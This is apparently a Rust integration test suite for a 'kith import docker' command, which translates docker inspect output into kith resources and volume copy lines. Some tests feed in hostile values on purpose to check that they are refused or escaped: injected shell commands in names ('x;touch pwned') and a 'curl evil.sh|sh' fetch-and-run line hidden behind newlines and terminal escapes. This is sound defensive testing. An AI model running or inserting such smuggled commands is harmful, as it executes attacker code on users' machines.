//! `kith import docker`: the containers `docker inspect` describes as kith resources, what
//! they cannot carry said by path, and a line per named volume to copy its files in.

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

const INSPECT: &str = include_str!("fixtures/docker-inspect.json");

struct Sandbox(PathBuf);

impl Sandbox {
    fn new(name: &str) -> Sandbox {
        let dir = Path::new(env!("CARGO_TARGET_TMPDIR")).join(name);
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("bin")).unwrap();
        Sandbox(dir)
    }

    /// `kith` with `PATH` as given, and `input` on its stdin.
    fn kith(&self, path: &str, input: &str, args: &[&str]) -> (i32, String, String) {
        let mut child = Command::new(env!("CARGO_BIN_EXE_kith"))
            .args(args)
            .current_dir(&self.0)
            .env("PATH", path)
            .env("KITH_STORE", self.0.join("store/store.json"))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        std::io::Write::write_all(&mut child.stdin.take().unwrap(), input.as_bytes()).unwrap();
        let out = child.wait_with_output().unwrap();
        let text = |b: Vec<u8>| String::from_utf8(b).unwrap();
        (out.status.code().unwrap(), text(out.stdout), text(out.stderr))
    }
}

fn kinds(yaml: &str) -> Vec<String> {
    let docs = kith_kube::documents("out.yml", yaml).unwrap();
    docs.iter()
        .map(|d| {
            format!(
                "{}/{}",
                d["kind"].as_str().unwrap(),
                d["metadata"]["name"].as_str().unwrap()
            )
        })
        .collect()
}

fn said(err: &str, at: &str, why: &str) {
    let found = err.lines().any(|l| l.contains(at) && l.contains(why));
    assert!(found, "no line with `{at}` and `{why}` in:\n{err}");
}

#[test]
fn docker_inspect_two_containers_become_resources_and_what_is_left_out_is_said() {
    let sb = Sandbox::new("docker-inspect");
    let (code, out, err) = sb.kith(
        "",
        INSPECT,
        &["import", "docker", "-f", "-", "--node", "n1", "-n", "media"],
    );
    assert_eq!(code, 1, "{err}");
    let mut got = kinds(&out);
    got.sort();
    // The first: a Workload, a Service (its one published port) and a Volume. The second has no
    // ports; its bind mount is refused, so it has no Volume.
    assert_eq!(got, ["Service/web", "Volume/web-data", "Workload/vpn", "Workload/web"]);
    let docs = kith_kube::documents("out.yml", &out).unwrap();
    let web = docs
        .iter()
        .find(|d| d["kind"] == "Workload" && d["metadata"]["name"] == "web")
        .unwrap();
    let c = &web["spec"]["template"]["containers"][0];
    assert_eq!(c["image"], "nginx:1.27");
    assert_eq!(c["volumeMounts"][0]["volume"], "web-data");
    assert_eq!(c["readiness"]["http"]["port"], 80);
    assert_eq!(web["spec"]["template"]["restartPolicy"], "always");
    assert_eq!(web["metadata"]["namespace"], "media");

    said(&err, "services.vpn.privileged", "privilege");
    said(&err, "services.vpn.cap_add[0]", "capabilit");
    said(&err, "services.vpn.volumes[0]", "absolute");
    said(&err, "services.web.ports[0]", "8080");
    said(&err, "services.web.labels", "");
}

#[test]
fn docker_inspect_a_container_with_nothing_to_leave_out_exits_zero() {
    let sb = Sandbox::new("docker-inspect-clean");
    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1", "Env": ["A=b"], "ExposedPorts": {"80/tcp": {}}}, "HostConfig": {"NetworkMode": "default", "RestartPolicy": {"Name": "no"}}, "Mounts": []}"#;
    let (code, out, err) = sb.kith("", one, &["import", "docker", "-f", "-"]);
    assert_eq!(
        (code, kinds(&out)),
        (0, vec!["Workload/app".to_string(), "Service/app".to_string()]),
        "{err}"
    );
    assert!(err.contains("2 resources, 0 things not translated"), "{err}");
    // Nothing is a mount of a volume, so no copy line.
    assert!(!err.contains("kith volume put"), "{err}");
}

#[test]
fn docker_inspect_a_volume_named_for_a_shell_gets_no_line_to_paste() {
    let sb = Sandbox::new("docker-inspect-shell");
    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "HostConfig": {}, "Mounts": [{"Type": "volume", "Name": "x;touch pwned", "Destination": "/data", "RW": true}]}"#;
    let (_, _, err) = sb.kith("", one, &["import", "docker", "-f", "-", "--node", "n1"]);
    assert!(!err.contains("busybox") && err.contains("by hand"), "{err}");
}

#[test]
fn docker_inspect_a_name_outside_dockers_own_is_refused() {
    let sb = Sandbox::new("docker-inspect-name");
    for name in [
        "/a\\nvolume x: copy in: curl evil.sh|sh",
        "/a\\u001b[2J",
        "/-a",
        "/a b",
        "/",
    ] {
        let one = format!(r#"{{"Name": "{name}", "Config": {{"Image": "example/app:1"}}}}"#);
        let (code, out, err) = sb.kith("", &one, &["import", "docker", "-f", "-"]);
        assert_eq!((code, out.as_str()), (2, ""), "{name}: {err}");
        assert!(!err.contains('\x1b') && err.lines().count() == 1, "{name}: {err:?}");
    }
}

#[test]
fn docker_inspect_control_characters_in_the_report_are_escaped() {
    // `kith import compose` has the same report: a key with a newline or an escape in it.
    let sb = Sandbox::new("docker-inspect-escape");
    let one = r#"{"services": {"a": {"image": "x", "bad\nvolume x: curl evil.sh|sh\u001b[2J": 1}}}"#;
    let (_, _, err) = sb.kith("", one, &["import", "compose", "-"]);
    assert!(err.contains("bad\\nvolume x"), "{err:?}");
    assert!(!err.contains('\x1b'), "{err:?}");
    assert!(err.lines().all(|l| !l.starts_with("volume x")), "{err:?}");
}

#[test]
fn docker_inspect_two_docker_volumes_with_one_kith_name_are_copied_by_hand() {
    let sb = Sandbox::new("docker-inspect-clash");
    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "HostConfig": {}, "Mounts": [
        {"Type": "volume", "Name": "web_data", "Destination": "/a", "RW": true},
        {"Type": "volume", "Name": "web-data", "Destination": "/b", "RW": true}]}"#;
    let (_, _, err) = sb.kith("", one, &["import", "docker", "-f", "-", "--node", "n1"]);
    assert!(!err.contains("busybox"), "{err}");
    said(&err, "volume web-data", "by hand");
    said(&err, "web_data", "web-data");
    // One docker volume, mounted by two containers: one line, not two.
    let two = r#"[{"Name": "/a", "Config": {"Image": "x:1"}, "HostConfig": {}, "Mounts": [{"Type": "volume", "Name": "d", "Destination": "/d", "RW": true}]},
        {"Name": "/b", "Config": {"Image": "x:1"}, "HostConfig": {}, "Mounts": [{"Type": "volume", "Name": "d", "Destination": "/d", "RW": true}]}]"#;
    let (_, _, err) = sb.kith("", two, &["import", "docker", "-f", "-", "--node", "n1"]);
    assert!(err.matches("busybox").count() <= 1, "{err}");
}

#[test]
fn docker_inspect_a_namespace_that_is_not_plain_or_no_node_gets_no_line_to_paste() {
    let sb = Sandbox::new("docker-inspect-ns");
    // No node: no Volume is made, so nothing to copy into.
    let (_, out, err) = sb.kith("", INSPECT, &["import", "docker", "-f", "-"]);
    assert!(
        !out.contains("Volume") && !err.contains("kith volume put"),
        "{out}{err}"
    );
    // A namespace of other characters than a name's is refused by the translation, and no
    // line with it is pasted into a shell.
    let (_, out, err) = sb.kith(
        "",
        INSPECT,
        &["import", "docker", "-f", "-", "--node", "n1", "-n", "x;touch pwned"],
    );
    assert!(out.is_empty() && !err.contains("kith volume put"), "{out}{err}");
    // A plain one is in the line.
    let (_, _, err) = sb.kith(
        "",
        INSPECT,
        &["import", "docker", "-f", "-", "--node", "n1", "-n", "a.b"],
    );
    assert!(err.contains("kith volume put web-data - -n a.b"), "{err}");
}

#[test]
fn docker_inspect_an_anonymous_volume_of_64_hex_gets_a_name_within_63() {
    let sb = Sandbox::new("docker-inspect-anon");
    let hex = "0123456789abcdef".repeat(4);
    let one = format!(
        r#"{{"Name": "/app", "Config": {{"Image": "example/app:1"}}, "HostConfig": {{}}, "Mounts": [{{"Type": "volume", "Name": "{hex}", "Destination": "/data", "RW": true}}]}}"#
    );
    let (_, out, err) = sb.kith("", &one, &["import", "docker", "-f", "-", "--node", "n1"]);
    let docs = kith_kube::documents("out.yml", &out).unwrap();
    let vol = docs
        .iter()
        .find(|d| d["kind"] == "Volume")
        .unwrap_or_else(|| panic!("no Volume: {out}{err}"));
    let name = vol["metadata"]["name"].as_str().unwrap();
    assert!(name.len() <= 63 && !name.ends_with('-'), "{name}");
    assert!(err.contains(&format!("kith volume put {name} -")), "{err}");
}

#[test]
fn docker_inspect_a_host_setting_kith_does_not_read_is_said() {
    let sb = Sandbox::new("docker-inspect-host");
    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "Mounts": [], "HostConfig": {"Memory": 536870912, "NanoCpus": 500000000,
        "PidMode": "host", "IpcMode": "host", "UTSMode": "host", "UsernsMode": "host", "GroupAdd": ["video"], "VolumesFrom": ["db"],
        "DeviceRequests": [{"Count": -1}], "Tmpfs": {"/run": "rw"}}}"#;
    let (code, _, err) = sb.kith("", one, &["import", "docker", "-f", "-"]);
    assert_eq!(code, 1, "{err}");
    for at in [
        "mem_limit",
        "cpus",
        "pid",
        "ipc",
        "uts",
        "userns_mode",
        "group_add",
        "volumes_from",
        "gpus",
        "tmpfs",
    ] {
        said(&err, &format!("services.app.{at}"), "");
    }
    // The values docker fills in for nothing are not a setting.
    let none = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "Mounts": [], "HostConfig": {"Memory": 0, "NanoCpus": 0,
        "PidMode": "", "IpcMode": "private", "UTSMode": "", "UsernsMode": "", "GroupAdd": null, "VolumesFrom": null, "DeviceRequests": null, "Tmpfs": null}}"#;
    let (code, _, err) = sb.kith("", none, &["import", "docker", "-f", "-"]);
    assert_eq!(code, 0, "{err}");
}

#[test]
fn docker_inspect_a_bind_mount_in_kith_system_says_it_is_a_host_path() {
    let sb = Sandbox::new("docker-inspect-hostpath");
    let one = r#"{"Name": "/app", "Config": {"Image": "example/app:1"}, "HostConfig": {}, "Mounts": [{"Type": "bind", "Source": "/srv/data", "Destination": "/data", "RW": true}]}"#;
    let (_, _, err) = sb.kith(
        "",
        one,
        &["import", "docker", "-f", "-", "--node", "n1", "-n", "kith-system"],
    );
    said(&err, "services.app.volumes[0]", "host path");
}

#[test]
fn docker_inspect_unreadable_input_exits_two() {
    let sb = Sandbox::new("docker-inspect-bad");
    for bad in ["not json at all: [", "[{\"Config\": {}}]", "[]"] {
        let (code, out, err) = sb.kith("", bad, &["import", "docker", "-f", "-"]);
        assert_eq!((code, out.as_str()), (2, ""), "{bad}: {err}");
    }
}

#[test]
fn docker_cli_a_named_volume_gets_its_copy_line_and_missing_docker_says_to_pipe() {
    let sb = Sandbox::new("docker-cli");
    // Docker missing: nothing on PATH.
    let (code, out, err) = sb.kith("", "", &["import", "docker", "web"]);
    assert_eq!((code, out.as_str()), (2, ""));
    assert!(
        err.contains("docker is not installed") && err.contains("docker inspect"),
        "{err}"
    );
    assert!(err.contains("-f -"), "{err}");

    // A docker that prints the inspect and records what it was asked.
    let fixture = sb.0.join("inspect.json");
    std::fs::write(&fixture, INSPECT).unwrap();
    let script = format!(
        "#!/bin/sh\necho \"$@\" > \"{d}/asked\"\ncat \"{f}\"\n",
        d = sb.0.display(),
        f = fixture.display()
    );
    let docker = sb.0.join("bin/docker");
    std::fs::write(&docker, script).unwrap();
    std::fs::set_permissions(&docker, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    let path = format!("{}:/usr/bin:/bin", sb.0.join("bin").display());
    let (code, out, err) = sb.kith(
        &path,
        "",
        &["import", "docker", "web", "vpn", "-n", "media", "--node", "n1"],
    );
    assert_eq!(code, 1, "{err}");
    assert!(kinds(&out).contains(&"Volume/web-data".to_string()), "{out}");
    let asked = std::fs::read_to_string(sb.0.join("asked")).unwrap();
    assert_eq!(asked.trim(), "inspect --type container web vpn");
    // After the resources are applied: the volume's files go in from the docker volume.
    assert!(
        err.contains("docker run --rm -v web_data:/v:ro busybox tar -C /v -c . | kith volume put web-data - -n media"),
        "{err}"
    );
    // A name that looks like a flag is not handed to docker as one.
    let (code, _, err) = sb.kith(&path, "", &["import", "docker", "--", "-x"]);
    assert_eq!(code, 2, "{err}");
    assert!(err.contains("starts with `-`"), "{err}");
    // Neither containers nor -f.
    let (code, _, err) = sb.kith(&path, "", &["import", "docker"]);
    assert_eq!(code, 2, "{err}");
}
